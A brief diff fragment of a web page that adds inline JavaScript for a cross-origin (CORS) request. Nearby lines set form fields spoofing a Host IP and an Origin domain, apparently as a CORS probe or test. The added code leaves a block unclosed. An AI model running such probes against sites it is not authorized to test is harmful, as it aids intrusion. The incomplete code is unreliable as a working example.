@@ -22,6 +22,9 @@
   <script async="" defer="" src="https://buttons.github.io/buttons.js"></script>
   
   <script>
+    var xhr = createCORSRequest('GET', url);
+if (!xhr) {
+  throw new Error('CORS not supported');	  
     var data = new FormData();
     data.append('Host', '104.24.30.49')
     data.append('Origin', 'deconsecurity.com')	  
